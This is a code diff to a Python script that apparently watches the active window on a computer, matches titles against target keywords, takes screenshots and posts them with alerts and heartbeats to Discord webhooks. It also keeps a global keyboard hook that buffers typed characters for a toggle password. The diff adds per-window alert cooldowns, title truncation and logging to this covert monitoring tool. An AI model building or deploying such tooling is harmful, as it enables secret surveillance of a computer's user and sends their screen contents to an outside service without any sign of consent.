@@ -116,11 +116,16 @@ lock = threading.Lock() # Thread safety
 tracking_enabled = True  # Master toggle for tracking
 password_buffer = ""    # Stores typed characters for password detection
 last_key_time = 0       # For clearing password buffer after timeout
-detected_targets = set()  # Track already detected targets to avoid duplicate notifications
 last_heartbeat_time = time.time()  # Track when last heartbeat was sent
 program_start_time = time.time()  # Track program start time
 
-# ---------------- HELPERS ---------------- #
+# Track focus state to prevent spam
+current_focused_hwnd = None  # Current window handle
+current_focused_title = None  # Current window title
+last_alert_time = 0  # Last time we sent an alert
+alert_cooldown = 60  # 60 seconds minimum between alerts for same window
+recently_alerted_windows = {}  # Dict to track recently alerted windows: {hwnd: (title, alert_time)}
+
 def title_matches_target(title: str) -> bool:
     title_lower = title.lower()
     return any(keyword in title_lower for keyword in TARGET_KEYWORDS)
@@ -256,7 +261,7 @@ def send_discord_alert(title, keyword, screenshot=None):
     
     payload = {
         "embeds": [embed],
-        "content": f"🚨 **Target detected:** {title}"
+        "content": f"🚨 **Target detected:** {title[:100]}"
     }
     
     return send_to_all_webhooks(payload, screenshot)
@@ -350,10 +355,13 @@ def send_startup_message():
 
 def toggle_tracking():
     """Toggle tracking on/off"""
-    global tracking_enabled, password_buffer
+    global tracking_enabled, password_buffer, recently_alerted_windows
     tracking_enabled = not tracking_enabled
     status = "ENABLED" if tracking_enabled else "DISABLED"
     print(f"[TRACKING] Tracking {status}")
+    
+    # Clear recently alerted windows when toggling
+    recently_alerted_windows.clear()
     
     # Send Discord notification about status change
     threading.Thread(target=send_discord_status, args=(status,), daemon=True).start()
@@ -414,6 +422,43 @@ def setup_keyboard_listener():
     
     return keyboard
 
+def should_send_alert(hwnd, title, keyword):
+    """Check if we should send an alert for this window"""
+    global current_focused_hwnd, current_focused_title, last_alert_time, recently_alerted_windows
+    
+    current_time = time.time()
+    
+    # Clean up old entries from recently_alerted_windows
+    to_remove = []
+    for window_hwnd, (window_title, alert_time) in list(recently_alerted_windows.items()):
+        if current_time - alert_time > alert_cooldown * 2:  # Clean up after 2x cooldown
+            to_remove.append(window_hwnd)
+    
+    for hwnd_key in to_remove:
+        del recently_alerted_windows[hwnd_key]
+    
+    # Check if this is a new focus or different window
+    if hwnd == current_focused_hwnd and title == current_focused_title:
+        # Same window still focused, check cooldown
+        if current_time - last_alert_time < alert_cooldown:
+            return False  # Still in cooldown period
+        
+        # Check if we've already alerted for this window recently
+        if hwnd in recently_alerted_windows:
+            window_title, last_alert = recently_alerted_windows[hwnd]
+            if current_time - last_alert < alert_cooldown:
+                return False  # Already alerted for this window recently
+    
+    # Update focus tracking
+    current_focused_hwnd = hwnd
+    current_focused_title = title
+    
+    # Record this alert
+    recently_alerted_windows[hwnd] = (title, current_time)
+    last_alert_time = current_time
+    
+    return True
+
 # ---------------- HEARTBEAT THREAD ---------------- #
 def heartbeat_monitor():
     """Periodically send heartbeat every 5 minutes"""
@@ -438,6 +483,7 @@ def heartbeat_monitor():
 # ---------------- MAIN LOOP ---------------- #
 print("[SYSTEM] Monitoring started...")
 print("[SYSTEM] Tracking is ENABLED by default")
+print(f"[SYSTEM] Alert cooldown: {alert_cooldown} seconds per window")
 
 # Send startup webhook immediately
 if DISCORD_WEBHOOKS and any(wh != "YOUR_DISCORD_WEBHOOK_URL_HERE" for wh in DISCORD_WEBHOOKS):
@@ -494,12 +540,8 @@ try:
                 if detected:
                     keyword = get_matching_keyword(title)
                     
-                    # Use a unique identifier for this detection
-                    detection_id = f"{title}_{keyword}_{int(time.time())}"
-                    
-                    if detection_id not in detected_targets:
-                        detected_targets.add(detection_id)
-                        
+                    # Check if we should send an alert for this window
+                    if should_send_alert(hwnd, title, keyword):
                         print(f"[DETECTION] Target detected: '{title}' (Keyword: {keyword})")
                         
                         # Small delay before taking screenshot to ensure window is focused
@@ -515,9 +557,14 @@ try:
                             daemon=True
                         )
                         alert_thread.start()
-                        
-                        # Clean up detected targets after 5 minutes
-                        threading.Timer(300, lambda: detected_targets.discard(detection_id)).start()
+                    else:
+                        # Debug logging for skipped alerts
+                        if hwnd == current_focused_hwnd:
+                            print(f"[SKIPPED] Already alerted for this window recently: '{title[:50]}...'")
+                else:
+                    # Not a target window, update focus tracking
+                    current_focused_hwnd = hwnd
+                    current_focused_title = title
 
             except Exception as e:
                 print(f"[ERROR] {e}")
